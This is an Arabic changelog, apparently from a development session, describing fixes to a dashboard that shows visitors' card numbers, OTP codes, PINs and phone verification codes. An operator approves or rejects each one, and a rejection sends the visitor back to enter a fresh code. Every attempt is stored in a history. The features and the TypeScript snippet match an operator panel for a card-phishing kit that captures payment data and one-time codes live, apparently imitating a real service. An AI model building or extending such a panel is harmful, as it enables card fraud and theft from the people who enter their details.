# إصلاحات اللوحة - كود الهاتف والتاريخ

## المشاكل المُصلحة

### 1. كود الهاتف يعلق عند الرفض
**المشكلة:** عندما يتم رفض كود تحقق الهاتف، يبقى الكود القديم معبأ في المودال

**الحل:**
- تم تحديث دالة `handlePhoneReject` لمسح `phoneVerificationCode` عند الرفض
- بعد الرفض، يتم توجيه الزائر تلقائياً لإدخال كود جديد (`phoneOtpStatus = "show_phone_otp"`)

```typescript
const handlePhoneReject = async () => {
  if (!visitor.id) return
  // Clear the old phone verification code and set status to rejected
  await updateApplication(visitor.id, { 
    phoneOtpStatus: "rejected" as any,
    phoneVerificationCode: "" // Clear the old code
  })
  // After a short delay, redirect to phone OTP input
  setTimeout(async () => {
    await updateApplication(visitor.id!, { phoneOtpStatus: "show_phone_otp" as any })
  }, 500)
  alert("تم رفض كود الهاتف وسيتم توجيه الزائر لإدخال كود جديد")
}
```

### 2. معلومات الهاتف من /phone-info لا تظهر
**المشكلة:** البيانات من صفحة `/phone-info` (رقم الجوال + شركة الاتصالات) لا تُعرض في اللوحة

**الحل:**
1. **إضافة حقل `phoneCarrier`** في `firestore-types.ts` لحفظ شركة الاتصالات
2. **إضافة فقاعة جديدة "معلومات الهاتف"** لعرض:
   - رقم الجوال (`phoneNumber`)
   - شركة الاتصالات (`phoneCarrier`)
3. **تغيير عنوان الفقاعة الحالية** من "معلومات الهاتف" إلى "كود تحقق الهاتف" لتمييزها

### 3. نفس الإصلاحات لـ OTP و PIN
تم تطبيق نفس منطق المسح على:
- **كود OTP:** يُمسح عند الرفض ويُعاد توجيه الزائر
- **كود PIN:** يُمسح عند رفض البطاقة
- **بيانات البطاقة:** تُمسح عند الرفض ويُعاد توجيه الزائر لصفحة الدفع

## الميزات الجديدة

### عرض جميع المحاولات من التاريخ
تم تحديث اللوحة لعرض **فقاعات متعددة** لكل محاولة من `history`:

#### 1. فقاعات البطاقة
- تعرض جميع البطاقات المُدخلة (من history + البطاقة الحالية)
- كل فقاعة تعرض حالتها: ✓ تم القبول / ✗ تم الرفض / ⏳ قيد التحقق / ⌛ في انتظار الإدخال
- الفقاعات مرقمة: "معلومات البطاقة #1", "معلومات البطاقة #2", إلخ

#### 2. فقاعات OTP
- تعرض جميع محاولات OTP (من history + الحالي)
- كل فقاعة تعرض الكود والحالة
- مرقمة: "كود OTP #1", "كود OTP #2", إلخ

#### 3. فقاعات PIN
- تعرض جميع محاولات PIN (من history + الحالي)
- كل فقاعة تعرض الكود والحالة
- مرقمة: "كود PIN #1", "كود PIN #2", إلخ

### دالة مساعدة لعرض الحالة
تم إضافة `getStatusLabel()` لتحويل الحالات إلى نصوص عربية مع رموز:
- `approved` → "✓ تم القبول"
- `rejected` / `otp_rejected` → "✗ تم الرفض"
- `verifying` → "⏳ قيد التحقق"
- `show_otp` / `show_pin` / `show_phone_otp` → "⌛ في انتظار الإدخال"

## ملاحظة مهمة

⚠️ **لكي تعمل الفقاعات المتعددة بشكل كامل، يجب تعديل التطبيق الأصلي (bcare-v2):**

1. حفظ البيانات في `history` عند كل محاولة:
   ```typescript
   history: [
     {
       step: 4,
       timestamp: "2024-12-01T...",
       data: {
         cardNumber: "5454...",
         cardType: "Mastercard",
         otpCode: "343333",
         otpStatus: "rejected",
         cardStatus: "rejected"
       }
     }
   ]
   ```

2. حفظ `phoneCarrier` عند إدخال معلومات الهاتف في `/phone-info`

## الملفات المعدلة
- `/home/ubuntu/dash-v3/components/visitor-details.tsx` - منطق عرض الفقاعات
- `/home/ubuntu/dash-v3/lib/firestore-types.ts` - إضافة حقل `phoneCarrier`

## التحديثات المنشورة
- **Commit 1:** `4510f6e` - Feature: Show all card/OTP/PIN attempts from history with status + Clear codes on rejection
- **Commit 2:** `05b7dba` - Fix: Clear phone verification code on rejection + Add phone basic info bubble + Add phoneCarrier field

## تاريخ الإصلاح
2025-12-01
